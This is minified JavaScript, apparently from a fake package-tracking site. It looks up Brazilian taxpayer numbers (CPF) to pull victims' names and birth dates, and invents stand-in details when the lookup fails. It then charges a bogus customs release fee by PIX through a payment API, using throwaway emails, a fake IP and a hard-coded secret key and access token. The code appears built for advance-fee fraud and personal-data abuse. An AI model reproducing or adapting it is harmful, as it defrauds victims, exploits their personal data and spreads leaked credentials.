import"./style-CGg7Jval.js";import{D as y,C as h,V as f,_ as v}from"./vega-data-DBlrl0up.js";import{N as P}from"./navigation-BreEIQuj.js";class S{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const a=await this.tryAPI(t);if(a)return console.log("Data obtained from API:",a),a}catch(a){console.error("API failed, using fallback:",a.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryAPI(e){const t=new AbortController,a=setTimeout(()=>t.abort(),1e4);try{console.log("🌐 CHAMANDO API OFICIAL PARA CPF:",e);const i=`/api/amnesia/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`;console.log("📋 URL DA API:",i);const o={signal:t.signal,method:"GET",headers:{Accept:"application/json","Content-Type":"application/json","Cache-Control":"no-cache"},credentials:"omit",cache:"no-store",mode:"cors"};console.log("⚙️ OPÇÕES DE FETCH:",o);const s=await fetch(i,o);if(clearTimeout(a),console.log("📊 Response status:",s.status,s.statusText),console.log("📋 Response headers:",Object.fromEntries(s.headers.entries())),!s.ok)throw console.error(`❌ ERRO HTTP: ${s.status} - ${s.statusText}`),new Error(`API Error: ${s.status} - ${s.statusText}`);const r=await s.text();if(console.log("📄 API Response Text:",r),!r||r.trim()==="")throw console.error("❌ RESPOSTA VAZIA DA API"),new Error("Resposta vazia da API");try{const n=JSON.parse(r);if(console.log("📊 Parsed API data:",n),n&&n.DADOS&&n.DADOS.nome&&n.DADOS.cpf)return console.log("✅ API RETORNOU DADOS VÁLIDOS:",{nome:n.DADOS.nome,cpf:n.DADOS.cpf,data_nascimento:n.DADOS.data_nascimento,sexo:n.DADOS.sexo}),console.log("🎯 NOME EXTRAÍDO DA API:",n.DADOS.nome),n;throw console.error("❌ Invalid data format from API:",n),new Error("Formato de dados inválido da API")}catch(n){throw console.error("❌ JSON parse error:",n),new Error("Erro ao processar resposta da API: "+n.message)}}catch(i){throw clearTimeout(a),console.error("❌ API call error details:",{name:i.name,message:i.message,stack:i.stack}),i.name==="AbortError"?(console.error("⏰ Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):i.message.includes("Failed to fetch")?(console.error("🌐 Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: Não foi possível acessar a API externa")):i}}getFallbackData(e){console.log("⚠️ USANDO DADOS FALLBACK PARA CPF:",e);const t=["JOÃO SILVA SANTOS","MARIA OLIVEIRA COSTA","PEDRO SOUZA LIMA","ANA PAULA FERREIRA","CARLOS EDUARDO ALVES","FERNANDA SANTOS ROCHA","RICARDO PEREIRA DIAS","JULIANA COSTA MARTINS","BRUNO ALMEIDA SILVA","CAMILA RODRIGUES NUNES","RAFAEL SANTOS BARBOSA","LARISSA OLIVEIRA CRUZ"],a=parseInt(e.slice(-2))%t.length,i=t[a];return console.log("📝 DADOS FALLBACK GERADOS:"),console.log("🆔 CPF:",e),console.log("👤 NOME FALLBACK:",i),{DADOS:{nome:i,cpf:e,data_nascimento:this.generateBirthDate(e),sexo:Math.random()>.5?"M":"F",nome_mae:this.generateMotherName(i)}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,a=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${a.toString().padStart(2,"0")}/${t}`}generateMotherName(e){const t=["MARIA JOSÉ SILVA","ANA MARIA OLIVEIRA","JOSÉ MARIA SANTOS","FRANCISCA SILVA","ANTÔNIA COSTA","MARIA DAS GRAÇAS","RITA DE CÁSSIA","SANDRA REGINA"],a=e.length%t.length;return t[a]}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class x{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_771c0f95ada260e7c2762cf26e2910dcc2efd47ca33899c5dc1c9d82c89b9be27f143f954da017fa9ffe9030ac5f0823cd50b6b6dee7a56c1a301dadf1b6a8f8";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var a,i;try{const o=Date.now(),s=this.generateUniqueEmail(o),r=this.generateUniquePhone(o),n=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const l={external_id:n,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:s,phone:r,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:l.external_id,total_amount:`R$ ${l.total_amount.toFixed(2)}`,payment_method:l.payment_method,webhook_url:l.webhook_url,ip:l.ip,customer:{name:l.customer.name,document:l.customer.document,email:l.customer.email,phone:l.customer.phone,document_type:l.customer.document_type}});const p={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":p["Content-Type"]});const d=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:p,body:JSON.stringify(l)});if(console.log("📡 Status da resposta:",d.status),console.log("📡 Headers da resposta:",Object.fromEntries(d.headers.entries())),!d.ok){const g=await d.text();throw console.error("❌ Erro na API Zentra Pay:",{status:d.status,statusText:d.statusText,body:g,headers:Object.fromEntries(d.headers.entries())}),new Error(`Erro na API: ${d.status} - ${g}`)}const c=await d.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:c.transaction_id||c.id,external_id:c.external_id,has_pix_payload:!!((a=c.pix)!=null&&a.payload),has_qr_code:!!((i=c.pix)!=null&&i.qr_code),status:c.status,payment_method:c.payment_method}),!c.pix||!c.pix.payload)throw console.error("❌ Resposta incompleta da API:",c),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",c.pix.payload),{success:!0,externalId:n,pixPayload:c.pix.payload,qrCode:c.pix.qr_code||null,transactionId:c.transaction_id||c.id,email:s,telefone:r,valor:t,status:c.status||"pending",paymentMethod:c.payment_method||"PIX",timestamp:o}}catch(o){return console.error("💥 Erro ao criar transação PIX:",{message:o.message,stack:o.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:o.message,details:o.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class u{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
        ...
        `,s){const d=r.querySelector(".delivery-retry-btn");d&&this.configureDeliveryRetryButton(d)}return r}configureDeliveryRetryButton(e){e.style.cssText=`
